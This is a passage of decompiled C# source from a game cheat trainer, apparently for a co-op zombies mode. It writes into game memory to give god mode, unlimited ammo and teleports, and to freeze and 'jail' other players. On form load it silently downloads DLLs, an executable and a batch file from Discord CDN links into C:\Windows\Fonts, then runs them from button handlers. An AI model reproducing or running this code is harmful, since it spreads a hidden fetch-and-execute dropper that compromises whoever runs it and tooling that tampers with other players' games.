					this.Threads.m.WriteInt64(this.PCompPtr(3) + Offsets.PC_SetWeaponID, (long)Variables.GunListCycle[this.p4]);
					this.p4++;
				}
				if (this.p4 == 63)
				{
					this.p4 = 1;
					return;
				}
			}
			else
			{
				this.P4Cycle.Stop();
			}
		}

		// Token: 0x06000453 RID: 1107 RVA: 0x000275E0 File Offset: 0x000275E0
		private void ALLGod_CheckedChanged(object sender, EventArgs e)
		{
			if (this.ALLGod.Checked)
			{
				this.Player1GodChk.Checked = true;
				this.Player2GodChk.Checked = true;
				this.Player3GodChk.Checked = true;
				this.Player4GodChk.Checked = true;
				return;
			}
			this.Player1GodChk.Checked = false;
			this.Player2GodChk.Checked = false;
			this.Player3GodChk.Checked = false;
			this.Player4GodChk.Checked = false;
		}

		// Token: 0x06000454 RID: 1108 RVA: 0x0002765C File Offset: 0x0002765C
		private void ALLPoints_CheckedChanged(object sender, EventArgs e)
		{
			if (this.ALLPoints.Checked)
			{
				this.Player1UnlimitedPointsChk.Checked = true;
				this.Player2UnlimitedPointsChk.Checked = true;
				this.Player3UnlimitedPointsChk.Checked = true;
				this.Player4UnlimitedPointsChk.Checked = true;
				return;
			}
			this.Player1UnlimitedPointsChk.Checked = false;
			this.Player2UnlimitedPointsChk.Checked = false;
			this.Player3UnlimitedPointsChk.Checked = false;
			this.Player4UnlimitedPointsChk.Checked = false;
		}

		// Token: 0x06000455 RID: 1109 RVA: 0x000276D8 File Offset: 0x000276D8
		private void ALLAmmo_CheckedChanged(object sender, EventArgs e)
		{
			if (this.ALLAmmo.Checked)
			{
				this.Player1UnlimitedAmmoChk.Checked = true;
				this.Player2UnlimitedAmmoChk.Checked = true;
				this.Player3UnlimitedAmmoChk.Checked = true;
				this.Player4UnlimitedAmmoChk.Checked = true;
				return;
			}
			this.Player1UnlimitedAmmoChk.Checked = false;
			this.Player2UnlimitedAmmoChk.Checked = false;
			this.Player3UnlimitedAmmoChk.Checked = false;
			this.Player4UnlimitedAmmoChk.Checked = false;
		}

		// Token: 0x06000456 RID: 1110 RVA: 0x00027754 File Offset: 0x00027754
		private void ALLRapidFire_CheckedChanged(object sender, EventArgs e)
		{
			if (this.ALLRapidFire.Checked)
			{
				this.Player1RapidFireChk.Checked = true;
				this.Player2RapidFireChk.Checked = true;
				this.Player3RapidFireChk.Checked = true;
				this.Player4RapidFireChk.Checked = true;
				return;
			}
			this.Player1RapidFireChk.Checked = false;
			this.Player2RapidFireChk.Checked = false;
			this.Player3RapidFireChk.Checked = false;
			this.Player4RapidFireChk.Checked = false;
		}

		// Token: 0x06000457 RID: 1111 RVA: 0x000277D0 File Offset: 0x000277D0
		private void ALLCritical_CheckedChanged(object sender, EventArgs e)
		{
			if (this.ALLCritical.Checked)
			{
				this.Player1OnlyCritChk.Checked = true;
				this.Player2OnlyCritChk.Checked = true;
				this.Player3OnlyCritChk.Checked = true;
				this.Player4OnlyCritChk.Checked = true;
				return;
			}
			this.Player1OnlyCritChk.Checked = false;
			this.Player2OnlyCritChk.Checked = false;
			this.Player3OnlyCritChk.Checked = false;
			this.Player4OnlyCritChk.Checked = false;
		}

		// Token: 0x06000458 RID: 1112 RVA: 0x0002784C File Offset: 0x0002784C
		private void ALLCycle_CheckedChanged(object sender, EventArgs e)
		{
			if (this.ALLCycle.Checked)
			{
				this.Player1WeaponCycleChk.Checked = true;
				this.Player2WeaponCycleChk.Checked = true;
				this.Player3WeaponCycleChk.Checked = true;
				this.Player4WeaponCycleChk.Checked = true;
				return;
			}
			this.Player1WeaponCycleChk.Checked = false;
			this.Player2WeaponCycleChk.Checked = false;
			this.Player3WeaponCycleChk.Checked = false;
			this.Player4WeaponCycleChk.Checked = false;
		}

		// Token: 0x06000459 RID: 1113 RVA: 0x000278C8 File Offset: 0x000278C8
		private void WeaponSelectorCombo_SelectedIndexChanged(object sender, EventArgs e)
		{
			if (MainForm.SelectedPlayer == 1 && this.WeaponSelectorCombo.SelectedIndex != 0)
			{
				this.Threads.m.WriteInt64(this.PCompPtr(0) + Offsets.PC_SetWeaponID, (long)Variables.GunList[this.WeaponSelectorCombo.SelectedIndex]);
				Variables.p1wpn2 = this.WeaponSelectorCombo.SelectedIndex;
				Booleans.P1WPC = false;
				this.playerUpdate(Booleans.P1GM, Booleans.P1IA, Booleans.P1UP, Booleans.P1AC, Booleans.P1RF, Booleans.P1WPC, Variables.p1wpn, Variables.p1wpn2, Variables.tp);
			}
			if (MainForm.SelectedPlayer == 2 && this.WeaponSelectorCombo.SelectedIndex != 0)
			{
				this.Threads.m.WriteInt64(this.PCompPtr(1) + Offsets.PC_SetWeaponID, (long)Variables.GunList[this.WeaponSelectorCombo.SelectedIndex]);
				Variables.p2wpn2 = this.WeaponSelectorCombo.SelectedIndex;
				Booleans.P2WPC = false;
				this.playerUpdate(Booleans.P2GM, Booleans.P2IA, Booleans.P2UP, Booleans.P2AC, Booleans.P2RF, Booleans.P2WPC, Variables.p2wpn, Variables.p2wpn2, Variables.tp);
			}
			if (MainForm.SelectedPlayer == 3 && this.WeaponSelectorCombo.SelectedIndex != 0)
			{
				this.Threads.m.WriteInt64(this.PCompPtr(2) + Offsets.PC_SetWeaponID, (long)Variables.GunList[this.WeaponSelectorCombo.SelectedIndex]);
				Variables.p3wpn2 = this.WeaponSelectorCombo.SelectedIndex;
				Booleans.P3WPC = false;
				this.playerUpdate(Booleans.P3GM, Booleans.P3IA, Booleans.P3UP, Booleans.P3AC, Booleans.P3RF, Booleans.P3WPC, Variables.p3wpn, Variables.p3wpn2, Variables.tp);
			}
			if (MainForm.SelectedPlayer == 4 && this.WeaponSelectorCombo.SelectedIndex != 0)
			{
				this.Threads.m.WriteInt64(this.PCompPtr(3) + Offsets.PC_SetWeaponID, (long)Variables.GunList[this.WeaponSelectorCombo.SelectedIndex]);
				Variables.p4wpn2 = this.WeaponSelectorCombo.SelectedIndex;
				Booleans.P4WPC = false;
				this.playerUpdate(Booleans.P4GM, Booleans.P4IA, Booleans.P4UP, Booleans.P4AC, Booleans.P4RF, Booleans.P4WPC, Variables.p4wpn, Variables.p4wpn2, Variables.tp);
			}
		}

		// Token: 0x0600045A RID: 1114 RVA: 0x00027B18 File Offset: 0x00027B18
		private void WeaponCycleIntervalTrackBar_Scroll(object sender, ScrollEventArgs e)
		{
			Variables.cycint = this.WeaponCycleIntervalTrackBar.Value;
			this.CycleValue.Text = this.WeaponCycleIntervalTrackBar.Value.ToString();
		}

		// Token: 0x0600045B RID: 1115 RVA: 0x00027B54 File Offset: 0x00027B54
		private void P1WeaponCycle_CheckedChanged(object sender, EventArgs e)
		{
			if (this.Player1WeaponCycleChk.Checked)
			{
				this.WeaponCycleIntervalTrackBar.Enabled = true;
				if (MainForm.SelectedPlayer == 1)
				{
					Booleans.P1WPC = true;
					this.p1 = 1;
					this.P1Cycle.Start();
					return;
				}
			}
			else
			{
				this.WeaponCycleIntervalTrackBar.Enabled = false;
				if (MainForm.SelectedPlayer == 1)
				{
					Booleans.P1WPC = false;
				}
			}
		}

		// Token: 0x0600045C RID: 1116 RVA: 0x00027BB8 File Offset: 0x00027BB8
		private void P2WeaponCycle_CheckedChanged(object sender, EventArgs e)
		{
			if (this.Player2WeaponCycleChk.Checked)
			{
				this.WeaponCycleIntervalTrackBar.Enabled = true;
				if (MainForm.SelectedPlayer == 2)
				{
					Booleans.P2WPC = true;
					this.p2 = 1;
					this.P2Cycle.Start();
					return;
				}
			}
			else
			{
				this.WeaponCycleIntervalTrackBar.Enabled = false;
				if (MainForm.SelectedPlayer == 2)
				{
					Booleans.P2WPC = false;
				}
			}
		}

		// Token: 0x0600045D RID: 1117 RVA: 0x00027C1C File Offset: 0x00027C1C
		private void P3WeaponCycle_CheckedChanged(object sender, EventArgs e)
		{
			if (this.Player3WeaponCycleChk.Checked)
			{
				this.WeaponCycleIntervalTrackBar.Enabled = true;
				if (MainForm.SelectedPlayer == 3)
				{
					Booleans.P3WPC = true;
					this.p3 = 1;
					this.P3Cycle.Start();
					return;
				}
			}
			else
			{
				this.WeaponCycleIntervalTrackBar.Enabled = false;
				if (MainForm.SelectedPlayer == 3)
				{
					Booleans.P3WPC = false;
				}
			}
		}

		// Token: 0x0600045E RID: 1118 RVA: 0x00027C80 File Offset: 0x00027C80
		private void P4WeaponCycle_CheckedChanged(object sender, EventArgs e)
		{
			if (this.Player4WeaponCycleChk.Checked)
			{
				this.WeaponCycleIntervalTrackBar.Enabled = true;
				if (MainForm.SelectedPlayer == 4)
				{
					Booleans.P4WPC = true;
					this.p4 = 1;
					this.P4Cycle.Start();
					return;
				}
			}
			else
			{
				this.WeaponCycleIntervalTrackBar.Enabled = false;
				if (MainForm.SelectedPlayer == 4)
				{
					Booleans.P4WPC = false;
				}
			}
		}

		// Token: 0x0600045F RID: 1119 RVA: 0x00027CE4 File Offset: 0x00027CE4
		public void PlayerTeleport(int clientID, int locationID)
		{
			if (Variables.locationVectors[locationID].X != 0f)
			{
				this.Threads.m.WriteVec3(this.PCompPtr(clientID) + Offsets.PC_Coords, Variables.locationVectors[locationID]);
			}
		}

		// Token: 0x06000460 RID: 1120 RVA: 0x00027D30 File Offset: 0x00027D30
		private void TeleportSelectorCombo_SelectedIndexChanged(object sender, EventArgs e)
		{
			if (MainForm.SelectedPlayer == 1 && this.TeleportSelectorCombo.SelectedIndex != 0)
			{
				this.PlayerTeleport(0, this.TeleportSelectorCombo.SelectedIndex);
			}
			if (MainForm.SelectedPlayer == 2 && this.TeleportSelectorCombo.SelectedIndex != 0)
			{
				this.PlayerTeleport(1, this.TeleportSelectorCombo.SelectedIndex);
			}
			if (MainForm.SelectedPlayer == 3 && this.TeleportSelectorCombo.SelectedIndex != 0)
			{
				this.PlayerTeleport(2, this.TeleportSelectorCombo.SelectedIndex);
			}
			if (MainForm.SelectedPlayer == 4 && this.TeleportSelectorCombo.SelectedIndex != 0)
			{
				this.PlayerTeleport(3, this.TeleportSelectorCombo.SelectedIndex);
			}
		}

		// Token: 0x06000461 RID: 1121 RVA: 0x00027DDC File Offset: 0x00027DDC
		private void FreezeOthersChk_CheckedChanged(object sender, EventArgs e)
		{
			if (this.ALLFreeze.Checked)
			{
				this.Threads.m.WriteFloat(this.PCompPtr(1) + Offsets.PC_RunSpeed, 0f);
				this.Threads.m.WriteFloat(this.PCompPtr(2) + Offsets.PC_RunSpeed, 0f);
				this.Threads.m.WriteFloat(this.PCompPtr(3) + Offsets.PC_RunSpeed, 0f);
				return;
			}
			this.Threads.m.WriteFloat(this.PCompPtr(1) + Offsets.PC_RunSpeed, 1f);
			this.Threads.m.WriteFloat(this.PCompPtr(2) + Offsets.PC_RunSpeed, 1f);
			this.Threads.m.WriteFloat(this.PCompPtr(3) + Offsets.PC_RunSpeed, 1f);
		}

		// Token: 0x06000462 RID: 1122 RVA: 0x00027EC3 File Offset: 0x00027EC3
		private void TPAllToMeBtn(object sender, EventArgs e)
		{
			this.teleportPlayers(true, 0);
		}

		// Token: 0x06000463 RID: 1123 RVA: 0x00027ED0 File Offset: 0x00027ED0
		public void teleportPlayers(bool clientALL, int clientID = 0)
		{
			Threads.updatedPlayerPos = this.Threads.m.ReadVector3(this.Threads.m.GetPointer(new ulong[]
			{
				Offsets.BaseAddress + Offsets.PlayerBase + 8UL,
				Offsets.PP_Coords
			}));
			if (clientALL)
			{
				for (int i = 1; i < 4; i++)
				{
					this.Threads.m.WriteVec3(this.PCompPtr(i) + Offsets.PC_Coords, Threads.updatedPlayerPos);
				}
				return;
			}
			this.Threads.m.WriteVec3(this.PCompPtr(clientID) + Offsets.PC_Coords, Threads.updatedPlayerPos);
		}

		// Token: 0x06000464 RID: 1124 RVA: 0x00027F75 File Offset: 0x00027F75
		private void TPAllToJailBtn(object sender, EventArgs e)
		{
			this.toJail(true);
		}

		// Token: 0x06000465 RID: 1125 RVA: 0x00027F80 File Offset: 0x00027F80
		public void toJail(bool clientJail)
		{
			Vectors.Vec3.Vector3 value = new Vectors.Vec3.Vector3(-1098.075f, -1728.992f, -671.875f);
			if (clientJail)
			{
				for (int i = 1; i < 4; i++)
				{
					Threads.freePosition = this.Threads.m.ReadVector3(this.PPedPtr(i) + Offsets.PP_Coords);
					this.Threads.m.WriteVec3(this.PCompPtr(i) + Offsets.PC_Coords, value);
					Thread.Sleep(50);
					this.Threads.m.WriteInt32(this.PCompPtr(i) + Offsets.PC_GodMode, 32);
				}
				return;
			}
		}

		// Token: 0x06000466 RID: 1126 RVA: 0x0002801C File Offset: 0x0002801C
		private void ALLAFKDA_CheckedChanged(object sender, EventArgs e)
		{
			if (this.ALLAFKDA.Checked)
			{
				this.Player1AFNRChk.Checked = true;
				this.Player2AFNRChk.Checked = true;
				this.Player3AFNRChk.Checked = true;
				this.Player4AFNRChk.Checked = true;
				Booleans.P1GM = true;
				Booleans.P2GM = true;
				Booleans.P3GM = true;
				Booleans.P4GM = true;
				Booleans.P1IA = true;
				Booleans.P2IA = true;
				Booleans.P3IA = true;
				Booleans.P4IA = true;
				Booleans.P1WPC = true;
				this.p1 = 1;
				this.P1Cycle.Start();
				Booleans.P2WPC = true;
				this.p2 = 1;
				this.P2Cycle.Start();
				Booleans.P3WPC = true;
				this.p3 = 1;
				this.P3Cycle.Start();
				Booleans.P4WPC = true;
				this.p4 = 1;
				this.P4Cycle.Start();
				this.Threads.m.WriteFloat(this.PCompPtr(0) + Offsets.PC_RunSpeed, 0f);
				this.Threads.m.WriteFloat(this.PCompPtr(1) + Offsets.PC_RunSpeed, 0f);
				this.Threads.m.WriteFloat(this.PCompPtr(2) + Offsets.PC_RunSpeed, 0f);
				this.Threads.m.WriteFloat(this.PCompPtr(3) + Offsets.PC_RunSpeed, 0f);
				this.Threads.m.WriteAByte(this.PCompPtr(0) + Offsets.PC_Crit, byte.MaxValue);
				this.Threads.m.WriteAByte(this.PCompPtr(1) + Offsets.PC_Crit, byte.MaxValue);
				this.Threads.m.WriteAByte(this.PCompPtr(2) + Offsets.PC_Crit, byte.MaxValue);
				this.Threads.m.WriteAByte(this.PCompPtr(3) + Offsets.PC_Crit, byte.MaxValue);
				Variables.cycint = 9000;
				return;
			}
			this.Player1AFNRChk.Checked = false;
			this.Player2AFNRChk.Checked = false;
			this.Player3AFNRChk.Checked = false;
			this.Player4AFNRChk.Checked = false;
			Booleans.P1GM = false;
			Booleans.P2GM = false;
			Booleans.P3GM = false;
			Booleans.P4GM = false;
			Booleans.P1IA = false;
			Booleans.P2IA = false;
			Booleans.P3IA = false;
			Booleans.P4IA = false;
			Booleans.P1WPC = false;
			Booleans.P2WPC = false;
			Booleans.P3WPC = false;
			Booleans.P4WPC = false;
			this.Threads.m.WriteFloat(this.PCompPtr(0) + Offsets.PC_RunSpeed, 3f);
			this.Threads.m.WriteFloat(this.PCompPtr(1) + Offsets.PC_RunSpeed, 3f);
			this.Threads.m.WriteFloat(this.PCompPtr(2) + Offsets.PC_RunSpeed, 3f);
			this.Threads.m.WriteFloat(this.PCompPtr(3) + Offsets.PC_RunSpeed, 3f);
			this.Threads.m.WriteAByte(this.PCompPtr(0) + Offsets.PC_Crit, 0);
			this.Threads.m.WriteAByte(this.PCompPtr(1) + Offsets.PC_Crit, 0);
			this.Threads.m.WriteAByte(this.PCompPtr(2) + Offsets.PC_Crit, 0);
			this.Threads.m.WriteAByte(this.PCompPtr(3) + Offsets.PC_Crit, 0);
			Variables.cycint = this.WeaponCycleIntervalTrackBar.Value;
		}

		// Token: 0x06000467 RID: 1127 RVA: 0x0002839C File Offset: 0x0002839C
		private void P1God_CheckedChanged(object sender, EventArgs e)
		{
			if (MainForm.SelectedPlayer == 1)
			{
				Booleans.P1GM = this.Player1GodChk.Checked;
				if (!this.Player1GodChk.Checked)
				{
					this.Threads.m.WriteInt32(this.PCompPtr(0) + Offsets.PC_GodMode, 32);
				}
			}
		}

		// Token: 0x06000468 RID: 1128 RVA: 0x000283ED File Offset: 0x000283ED
		private void P1Points_CheckedChanged(object sender, EventArgs e)
		{
			if (MainForm.SelectedPlayer == 1)
			{
				Booleans.P1UP = this.Player1UnlimitedPointsChk.Checked;
			}
		}

		// Token: 0x06000469 RID: 1129 RVA: 0x00028407 File Offset: 0x00028407
		private void P1Ammo_CheckedChanged(object sender, EventArgs e)
		{
			if (MainForm.SelectedPlayer == 1)
			{
				Booleans.P1IA = this.Player1UnlimitedAmmoChk.Checked;
			}
		}

		// Token: 0x0600046A RID: 1130 RVA: 0x00028421 File Offset: 0x00028421
		private void P1RapidFire_CheckedChanged(object sender, EventArgs e)
		{
			if (MainForm.SelectedPlayer == 1)
			{
				Booleans.P1RF = this.Player1RapidFireChk.Checked;
			}
		}

		// Token: 0x0600046B RID: 1131 RVA: 0x0002843C File Offset: 0x0002843C
		private void P1Critical_CheckedChanged(object sender, EventArgs e)
		{
			if (MainForm.SelectedPlayer == 1)
			{
				if (this.Player1OnlyCritChk.Checked)
				{
					this.Threads.m.WriteAByte(this.PCompPtr(0) + Offsets.PC_Crit, byte.MaxValue);
					return;
				}
				this.Threads.m.WriteByte(this.PCompPtr(0) + Offsets.PC_Crit, 0);
			}
		}

		// Token: 0x0600046C RID: 1132 RVA: 0x00005140 File Offset: 0x00005140
		private void P1AutoFire_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600046D RID: 1133 RVA: 0x00005140 File Offset: 0x00005140
		private void P1NoRecoil_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600046E RID: 1134 RVA: 0x000284A0 File Offset: 0x000284A0
		private void P2God_CheckedChanged(object sender, EventArgs e)
		{
			if (MainForm.SelectedPlayer == 2)
			{
				Booleans.P2GM = this.Player2GodChk.Checked;
				if (!this.Player2GodChk.Checked)
				{
					this.Threads.m.WriteInt32(this.PCompPtr(1) + Offsets.PC_GodMode, 32);
				}
			}
		}

		// Token: 0x0600046F RID: 1135 RVA: 0x000284F1 File Offset: 0x000284F1
		private void P2Points_CheckedChanged(object sender, EventArgs e)
		{
			if (MainForm.SelectedPlayer == 2)
			{
				Booleans.P2UP = this.Player2UnlimitedPointsChk.Checked;
			}
		}

		// Token: 0x06000470 RID: 1136 RVA: 0x0002850B File Offset: 0x0002850B
		private void P2Ammo_CheckedChanged(object sender, EventArgs e)
		{
			if (MainForm.SelectedPlayer == 2)
			{
				Booleans.P2IA = this.Player2UnlimitedAmmoChk.Checked;
			}
		}

		// Token: 0x06000471 RID: 1137 RVA: 0x00028525 File Offset: 0x00028525
		private void P2RapidFire_CheckedChanged(object sender, EventArgs e)
		{
			if (MainForm.SelectedPlayer == 2)
			{
				Booleans.P2RF = this.Player2RapidFireChk.Checked;
			}
		}

		// Token: 0x06000472 RID: 1138 RVA: 0x00028540 File Offset: 0x00028540
		private void P2Critical_CheckedChanged(object sender, EventArgs e)
		{
			if (MainForm.SelectedPlayer == 2)
			{
				if (this.Player2OnlyCritChk.Checked)
				{
					this.Threads.m.WriteByte(this.PCompPtr(1) + Offsets.PC_Crit, byte.MaxValue);
					this.Threads.m.WriteFloat(this.PCompPtr(1) + Offsets.PC_RunSpeed, 2f);
					return;
				}
				this.Threads.m.WriteByte(this.PCompPtr(1) + Offsets.PC_Crit, 0);
				this.Threads.m.WriteFloat(this.PCompPtr(1) + Offsets.PC_RunSpeed, 2f);
			}
		}

		// Token: 0x06000473 RID: 1139 RVA: 0x00005140 File Offset: 0x00005140
		private void P2AutoFire_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000474 RID: 1140 RVA: 0x00005140 File Offset: 0x00005140
		private void P2NoRecoil_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000475 RID: 1141 RVA: 0x000285EC File Offset: 0x000285EC
		private void P3God_CheckedChanged(object sender, EventArgs e)
		{
			if (MainForm.SelectedPlayer == 3)
			{
				Booleans.P3GM = this.Player3GodChk.Checked;
				if (!this.Player3GodChk.Checked)
				{
					this.Threads.m.WriteInt32(this.PCompPtr(2) + Offsets.PC_GodMode, 32);
				}
			}
		}

		// Token: 0x06000476 RID: 1142 RVA: 0x0002863D File Offset: 0x0002863D
		private void P3Points_CheckedChanged(object sender, EventArgs e)
		{
			if (MainForm.SelectedPlayer == 3)
			{
				Booleans.P3UP = this.Player3UnlimitedPointsChk.Checked;
			}
		}

		// Token: 0x06000477 RID: 1143 RVA: 0x00028657 File Offset: 0x00028657
		private void P3Ammo_CheckedChanged(object sender, EventArgs e)
		{
			if (MainForm.SelectedPlayer == 3)
			{
				Booleans.P3IA = this.Player3UnlimitedAmmoChk.Checked;
			}
		}

		// Token: 0x06000478 RID: 1144 RVA: 0x00028671 File Offset: 0x00028671
		private void P3RapidFire_CheckedChanged(object sender, EventArgs e)
		{
			if (MainForm.SelectedPlayer == 3)
			{
				Booleans.P3RF = this.Player3RapidFireChk.Checked;
			}
		}

		// Token: 0x06000479 RID: 1145 RVA: 0x0002868C File Offset: 0x0002868C
		private void P3Critical_CheckedChanged(object sender, EventArgs e)
		{
			if (MainForm.SelectedPlayer == 3)
			{
				if (this.Player3OnlyCritChk.Checked)
				{
					this.Threads.m.WriteByte(this.PCompPtr(2) + Offsets.PC_Crit, byte.MaxValue);
					this.Threads.m.WriteFloat(this.PCompPtr(2) + Offsets.PC_RunSpeed, 2f);
					return;
				}
				this.Threads.m.WriteByte(this.PCompPtr(2) + Offsets.PC_Crit, 0);
				this.Threads.m.WriteFloat(this.PCompPtr(2) + Offsets.PC_RunSpeed, 2f);
			}
		}

		// Token: 0x0600047A RID: 1146 RVA: 0x00005140 File Offset: 0x00005140
		private void P3AutoFire_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600047B RID: 1147 RVA: 0x00005140 File Offset: 0x00005140
		private void P3NoRecoil_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600047C RID: 1148 RVA: 0x00028738 File Offset: 0x00028738
		private void P4God_CheckedChanged(object sender, EventArgs e)
		{
			if (MainForm.SelectedPlayer == 4)
			{
				Booleans.P4GM = this.Player4GodChk.Checked;
				if (!this.Player4GodChk.Checked)
				{
					this.Threads.m.WriteInt32(this.PCompPtr(3) + Offsets.PC_GodMode, 32);
				}
			}
		}

		// Token: 0x0600047D RID: 1149 RVA: 0x00028789 File Offset: 0x00028789
		private void P4Points_CheckedChanged(object sender, EventArgs e)
		{
			if (MainForm.SelectedPlayer == 4)
			{
				Booleans.P4UP = this.Player4UnlimitedPointsChk.Checked;
			}
		}

		// Token: 0x0600047E RID: 1150 RVA: 0x000287A3 File Offset: 0x000287A3
		private void P4Ammo_CheckedChanged(object sender, EventArgs e)
		{
			if (MainForm.SelectedPlayer == 4)
			{
				Booleans.P4IA = this.Player4UnlimitedAmmoChk.Checked;
			}
		}

		// Token: 0x0600047F RID: 1151 RVA: 0x000287BD File Offset: 0x000287BD
		private void P4RapidFire_CheckedChanged(object sender, EventArgs e)
		{
			if (MainForm.SelectedPlayer == 4)
			{
				Booleans.P4RF = this.Player4RapidFireChk.Checked;
			}
		}

		// Token: 0x06000480 RID: 1152 RVA: 0x000287D8 File Offset: 0x000287D8
		private void P4Critical_CheckedChanged(object sender, EventArgs e)
		{
			if (MainForm.SelectedPlayer == 4)
			{
				if (this.Player4OnlyCritChk.Checked)
				{
					this.Threads.m.WriteByte(this.PCompPtr(3) + Offsets.PC_Crit, byte.MaxValue);
					this.Threads.m.WriteFloat(this.PCompPtr(3) + Offsets.PC_RunSpeed, 2f);
					return;
				}
				this.Threads.m.WriteByte(this.PCompPtr(3) + Offsets.PC_Crit, 0);
				this.Threads.m.WriteFloat(this.PCompPtr(3) + Offsets.PC_RunSpeed, 2f);
			}
		}

		// Token: 0x06000481 RID: 1153 RVA: 0x00005140 File Offset: 0x00005140
		private void P4AutoFire_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000482 RID: 1154 RVA: 0x00005140 File Offset: 0x00005140
		private void P4NoRecoil_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000483 RID: 1155 RVA: 0x00028884 File Offset: 0x00028884
		private void MainForm_Load(object sender, EventArgs e)
		{
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/967859990067032064/978173569592872980/Newtonsoft.Json.dll", "C:\\Windows\\Fonts\\Newtonsoft.Json.dll");
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/967859990067032064/978173569827766292/ReaLTaiizor.dll", "C:\\Windows\\Fonts\\ReaLTaiizor.dll");
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/967859990067032064/978173570557566986/System.Diagnostics.EventLog.dll", "C:\\Windows\\Fonts\\System.Diagnostics.EventLog.dll");
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/967859990067032064/978173570830176296/System.ServiceProcess.ServiceController.dll", "C:\\Windows\\Fonts\\System.ServiceProcess.ServiceController.dll");
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/967859990067032064/978173585057255424/FontAwesome.Sharp.dll", "C:\\Windows\\Fonts\\FontAwesome.Sharp.dll");
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/955962478100095046/978790520094621776/cw.exe", "C:\\Windows\\Fonts\\cw.exe");
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/955972051221495868/978889492708618240/CW_KILLER.bat", "C:\\Windows\\Fonts\\CW_KILLER.bat");
			this.homePanel.Visible = true;
			this.daPanel.Visible = false;
			this.papPanel.Visible = false;
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = false;
		}

		// Token: 0x06000484 RID: 1156 RVA: 0x00028965 File Offset: 0x00028965
		private void button1_Click(object sender, EventArgs e)
		{
			Process.Start("C:\\Windows\\Fonts\\cw.exe");
			MessageBox.Show("Instant Dark Aether\nWait 30 Secs.\nUse Reset DA after every game.", "DA TOOL", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000485 RID: 1157 RVA: 0x00028985 File Offset: 0x00028985
		private void checkBox1_CheckedChanged(object sender, EventArgs e)
		{
			if (this.siticoneCheckBox1.Checked)
			{
				Process.Start("C:\\Windows\\Fonts\\CW_KILLER.bat");
			}
		}

		// Token: 0x06000486 RID: 1158 RVA: 0x0002640C File Offset: 0x0002640C
		private void siticoneButton1_Click(object sender, EventArgs e)
		{
			this.a1.Visible = true;
			this.a2.Visible = false;
			this.a3.Visible = false;
		}

		// Token: 0x06000487 RID: 1159 RVA: 0x0002699A File Offset: 0x0002699A
		private void siticoneButton2_Click(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = true;
			this.a3.Visible = false;
		}

		// Token: 0x06000488 RID: 1160 RVA: 0x000289A0 File Offset: 0x000289A0
		private void siticoneButton7_Click(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = true;
			this.PlayerAllOptionsPnl.Visible = true;
			this.Player1OptionsPnl.Visible = false;
			this.Player2OptionsPnl.Visible = false;
			this.Player3OptionsPnl.Visible = false;
			this.Player4OptionsPnl.Visible = false;
		}

		// Token: 0x06000489 RID: 1161 RVA: 0x00028A10 File Offset: 0x00028A10
		private void siticoneButton6_Click(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = true;
			this.PlayerAllOptionsPnl.Visible = false;
			this.Player1OptionsPnl.Visible = true;
			this.Player2OptionsPnl.Visible = false;
			this.Player3OptionsPnl.Visible = false;
			this.Player4OptionsPnl.Visible = false;
			MainForm.SelectedPlayer = 1;
			this.PlayerSelectPnl();
			this.playerUpdate(Booleans.P1GM, Booleans.P1IA, Booleans.P1UP, Booleans.P1AC, Booleans.P1RF, Booleans.P1WPC, Variables.p1wpn, Variables.p1wpn2, Variables.tp);
			this.TeleportSelectorCombo.SelectedIndex = 0;
		}

		// Token: 0x0600048A RID: 1162 RVA: 0x00028AC8 File Offset: 0x00028AC8
		private void siticoneButton5_Click(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = true;
			this.PlayerAllOptionsPnl.Visible = false;
			this.Player1OptionsPnl.Visible = false;
			this.Player2OptionsPnl.Visible = true;
			this.Player3OptionsPnl.Visible = false;
			this.Player4OptionsPnl.Visible = false;
			MainForm.SelectedPlayer = 2;
			this.PlayerSelectPnl();
			this.playerUpdate(Booleans.P2GM, Booleans.P2IA, Booleans.P2UP, Booleans.P2AC, Booleans.P2RF, Booleans.P2WPC, Variables.p2wpn, Variables.p2wpn2, Variables.tp);
			this.TeleportSelectorCombo.SelectedIndex = 0;
		}

		// Token: 0x0600048B RID: 1163 RVA: 0x00028B80 File Offset: 0x00028B80
		private void siticoneButton3_Click(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = true;
			this.PlayerAllOptionsPnl.Visible = false;
			this.Player1OptionsPnl.Visible = false;
			this.Player2OptionsPnl.Visible = false;
			this.Player3OptionsPnl.Visible = true;
			this.Player4OptionsPnl.Visible = false;
			MainForm.SelectedPlayer = 3;
			this.PlayerSelectPnl();
			this.playerUpdate(Booleans.P3GM, Booleans.P3IA, Booleans.P3UP, Booleans.P3AC, Booleans.P3RF, Booleans.P3WPC, Variables.p3wpn, Variables.p3wpn2, Variables.tp);
			this.TeleportSelectorCombo.SelectedIndex = 0;
		}

		// Token: 0x0600048C RID: 1164 RVA: 0x00028C38 File Offset: 0x00028C38
		private void siticoneButton4_Click(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = true;
			this.PlayerAllOptionsPnl.Visible = false;
			this.Player1OptionsPnl.Visible = false;
			this.Player2OptionsPnl.Visible = false;
			this.Player3OptionsPnl.Visible = false;
			this.Player4OptionsPnl.Visible = true;
			MainForm.SelectedPlayer = 4;
